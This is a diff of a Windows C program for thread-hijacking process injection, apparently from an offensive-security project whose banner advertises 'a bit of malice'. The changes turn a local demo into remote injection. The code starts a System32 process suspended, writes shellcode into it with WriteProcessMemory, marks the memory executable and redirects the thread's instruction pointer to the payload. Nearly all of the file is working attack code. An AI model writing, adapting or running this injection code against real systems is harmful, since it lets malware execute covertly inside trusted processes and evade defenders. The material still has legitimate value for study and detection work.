@@ -1,4 +1,5 @@
 #include "injection.h"
+#include <memoryapi.h>
 
 VOID PrintBanner(VOID) {
     printf(
@@ -7,7 +8,7 @@ VOID PrintBanner(VOID) {
             "   / / / _ \\/ __/ -_) _ `/ _  / / _  / / / / _ `/ __/  '_/                                    \n"
             "  /_/ /_//_/_/  \\__/\\_,_/\\_,_/ /_//_/_/_/ /\\_,_/\\__/_/\\_\\                               \n"
             "                                     |___/                                                     \n"
-            "  ( ( local ) )                                                                              \n\n"
+            "  ( ( remote ) )                                                                             \n\n"
             "  /*!                                                                                          \n"
             "   * made with love and a bit of malice <3                                                     \n"
             "   * -> https://www.crow.rip, @cr-0w, crow@crow.rip                                            \n"
@@ -19,14 +20,52 @@ VOID PrintBanner(VOID) {
           );
 }
 
-VOID DummyFunction(VOID) {
-    /* this can be whatever you want */
-    MessageBoxW(NULL, L"Paulie Gualtieri says:", L"hehe.", MB_OK);
-    return;
+BOOL CreateSuspendedProcess(
+    _In_  LPCSTR ProcessName,
+	_Out_ PDWORD ProcessId,
+	_Out_ PHANDLE ProcessHandle,
+	_Out_ PHANDLE ThreadHandle
+) {
+
+    BOOL   State       = TRUE;
+    CHAR   Path[MAX_PATH * 2];
+    CHAR WindowsDir[MAX_PATH];
+    STARTUPINFO            SI;
+    PROCESS_INFORMATION    PI;
+
+    RtlSecureZeroMemory(&SI, sizeof(SI));
+    RtlSecureZeroMemory(&PI, sizeof(PI));
+
+    if (!GetEnvironmentVariableA("WINDIR", WindowsDir, MAX_PATH)) {
+        PRINT_ERROR("GetEnvironmentVariableA");
+        return FALSE;
+    }
+
+    sprintf_s(Path, sizeof(Path), "%s\\System32\\%s", WindowsDir, ProcessName);
+    INFO("attempting to start %s (%s)...", ProcessName, Path);
+
+    if (!CreateProcessA(NULL, Path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
+        PRINT_ERROR("CreateProcessA");
+        return FALSE;
+    }
+    OKAY("%s started in suspended mode!", ProcessName);
+
+    if (0 == PI.dwProcessId || NULL == PI.hProcess || NULL == PI.hThread) {
+        WARN("something broke, exiting...");
+        return FALSE;
+    } 
+
+    *ProcessId = PI.dwProcessId; *ProcessHandle = PI.hProcess; *ThreadHandle = PI.hThread;
+    OKAY("[0x%p] got a handle on the process (%ld)!", *ProcessHandle, *ProcessId); 
+    OKAY("[0x%p] got a handle on the thread (%ld)!", *ThreadHandle, PI.dwThreadId);
+
+    return TRUE;
+
 }
 
-BOOL LocalThreadHijack(
+BOOL RemoteThreadHijack(
         _In_ HANDLE ThreadHandle,
+        _In_ HANDLE ProcessHandle,
         _In_ PVOID  Buffer,
         _In_ PBYTE  Shellcode,
         _In_ SIZE_T ShellcodeSize
@@ -36,10 +75,10 @@ BOOL LocalThreadHijack(
     BOOL    State         = TRUE;
     CONTEXT CTX           = { .ContextFlags = CONTEXT_ALL }; 
 
-    RtlCopyMemory(Buffer, Shellcode, ShellcodeSize); /* just a wrapper for memcpy() */
+    WriteProcessMemory(ProcessHandle, Buffer, Shellcode, ShellcodeSize,0);
     OKAY("[0x%p] [RW-] copied payload contents (%zu-bytes) to the allocated buffer", Buffer, ShellcodeSize);
 
-    if (!VirtualProtect(Buffer, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection)) {
+    if (!VirtualProtectEx(ProcessHandle, Buffer, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection)) {
         PRINT_ERROR("VirtualProtect");
         State = FALSE; goto CLEANUP;
     }
@@ -52,6 +91,7 @@ BOOL LocalThreadHijack(
     OKAY("[0x%p] got the thread's context! here are the register values:", &CTX);
 
     printf(
+            "[v] |              \n"
             "[v] | RIP -> [0x%p]\n"
             "[v] | RAX -> [0x%p]\n"
             "[v] | RBX -> [0x%p]\n"
@@ -63,7 +103,7 @@ BOOL LocalThreadHijack(
             (PVOID*)CTX.Rcx, (PVOID*)CTX.Rdx, (PVOID*)CTX.Rsp, (PVOID*)CTX.Rbp
           );
 
-    INFO("[0x%p] updating the thread's context to make RIP point to our allocated buffer...", (PVOID*)CTX.Rip);
+    INFO("| RIP -> [0x%p] updating the thread's context to make RIP point to our allocated buffer...", (PVOID*)CTX.Rip);
 
     CTX.Rip = (DWORD64)Buffer;
 
@@ -71,7 +111,8 @@ BOOL LocalThreadHijack(
         PRINT_ERROR("SetThreadContext");
         State = FALSE; goto CLEANUP;
     }
-    OKAY("[0x%p] set the thread's context! RIP now points to our payload buffer!", (PVOID*)CTX.Rip);
+
+    OKAY("| RIP -> [0x%p] set the thread's context! RIP now points to our payload buffer!", (PVOID*)CTX.Rip);
 
     printf(
             "[v] | RIP -> [0x%p]\n" 
@@ -80,7 +121,8 @@ BOOL LocalThreadHijack(
             "[v] | RCX -> [0x%p]\n"
             "[v] | RDX -> [0x%p]\n"
             "[v] | RSP -> [0x%p]\n"
-            "[v] | RBP -> [0x%p]\n",
+            "[v] | RBP -> [0x%p]\n"
+            "[v] |              \n",
             (PVOID*)CTX.Rip, (PVOID*)CTX.Rax, (PVOID*)CTX.Rbx, 
             (PVOID*)CTX.Rcx, (PVOID*)CTX.Rdx, (PVOID*)CTX.Rsp, (PVOID*)CTX.Rbp
           );
